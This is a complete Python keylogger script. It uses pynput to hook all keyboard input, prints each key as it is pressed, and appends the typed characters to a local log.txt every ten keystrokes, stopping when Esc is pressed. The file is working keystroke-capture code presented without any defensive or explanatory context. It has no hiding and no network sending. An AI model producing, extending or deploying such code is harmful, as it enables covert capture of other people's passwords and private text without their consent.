from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10: 
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("log.txt","a") as log_file:
        for key in keys:
            key = str(key).replace("'","")
            if key.find("space") > 0:
                log_file.write('\n')
            elif key.find("Key") == -1:
                log_file.write(key)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
